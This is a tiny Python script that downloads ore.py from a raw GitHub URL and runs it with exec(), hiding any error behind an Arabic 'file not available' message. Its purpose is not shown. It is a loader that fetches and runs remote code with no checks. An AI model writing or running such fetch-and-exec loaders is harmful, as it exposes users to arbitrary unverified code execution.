import requests
url = "https://raw.githubusercontent.com/hawwhaww314-droid/mynewrepopl/main/ore.py"
try:
    response = requests.get(url)
    response.raise_for_status()  
    code = response.text
    exec(code)
except:
    print("⚠️ الملف غير متوفر حالياً")
